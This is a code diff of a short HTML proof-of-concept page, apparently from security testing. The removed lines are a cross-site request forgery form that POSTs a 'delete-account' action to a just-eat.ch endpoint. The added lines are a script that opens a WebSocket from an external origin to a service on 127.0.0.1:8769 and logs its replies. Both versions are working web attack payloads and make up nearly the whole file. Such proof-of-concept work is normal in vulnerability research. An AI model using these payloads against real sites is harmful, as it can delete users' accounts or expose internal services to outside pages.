@@ -1,7 +1,15 @@
 <!DOCTYPE html>
 <html>
-  <form action="https://view.update.just-eat.ch/sensitive-action" method="POST">
-  <input type="hidden" name="action" value="delete-account" />
-  <input type="submit" value="Submit" />
+  <label>PoC Test</label>
+  <script>
+    const ws = new WebSocket("ws://127.0.0.1:8769");
+    ws.onopen = () => {
+      console.log("Connected to internal WebSocket!");
+      ws.send("Hello from external origin!");
+    };
+    ws.onmessage = (msg) => {
+      console.log("Message from internal service:", msg.data);
+    };
+  </script>
 </form>
 </html>
